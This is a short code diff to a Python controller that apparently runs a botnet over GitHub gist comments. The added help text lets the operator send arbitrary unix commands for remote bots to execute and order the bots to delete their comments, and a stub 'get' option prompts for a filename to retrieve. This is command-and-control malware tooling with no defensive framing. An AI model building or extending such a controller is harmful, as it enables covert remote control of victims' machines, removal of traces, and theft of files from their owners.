@@ -14,7 +14,10 @@ parser = argparse.ArgumentParser(
     "post": create comment with text and bot command - this wil create a comment and use it for all subsequent commands
     "command": submit a bot command - this wil use last command comment or create a new one with random message 
     "commands": show commands and responses
+        <any unix command>: send unix command to be called by bots 
+        "clear": command bots to delete their comments
     "bots": show active bot count
+    "clear": delete controller comments
     "comments": show gist comments
     "exit": quit application
     """
@@ -193,11 +196,16 @@ while True:
             response = post_command(command)
             print(response)
 
+        case 'get':
+            filename = prompt("> Submit filename: ")
+            raise NotImplementedError()
+
         case 'bots':
             print(f'> bot count: {state["bot_count"]}')
 
         case 'clear':
             delete_comments()
+
         case 'exit':
             break
         case other:
